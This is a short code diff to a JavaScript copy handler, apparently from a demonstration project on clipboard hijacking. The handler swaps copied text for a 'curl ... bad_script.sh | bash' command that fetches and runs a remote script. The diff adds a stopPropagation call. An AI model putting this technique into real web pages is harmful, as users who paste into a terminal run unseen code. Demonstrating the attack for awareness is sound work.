@@ -3,5 +3,6 @@ document.getElementById('copyme').addEventListener(
         e.clipboardData.setData('text/plain',
         'curl https://raw.githubusercontent.com/marco97pa/copy-paste-hack-js/master/bad_script.sh | bash\n');
         e.preventDefault();
+        e.stopPropagation();
     }
 )
